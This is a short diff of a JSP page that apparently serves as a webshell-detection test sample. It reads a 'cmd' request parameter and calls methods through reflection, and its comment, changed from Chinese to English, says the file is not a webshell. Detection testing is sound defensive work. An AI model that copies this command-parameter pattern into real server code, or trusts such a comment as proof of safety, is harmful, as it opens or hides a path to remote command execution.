@@ -1,6 +1,6 @@
 <%@ page language="java" pageEncoding="UTF-8" %>
 <%
-    // 这不是webshell不应该被检测出
+    // not webshell
     String cmd = request.getParameter("cmd");
     Class rt = Class.forName("java.lang.String");
     java.lang.reflect.Method gr = rt.getMethod("getBytes");
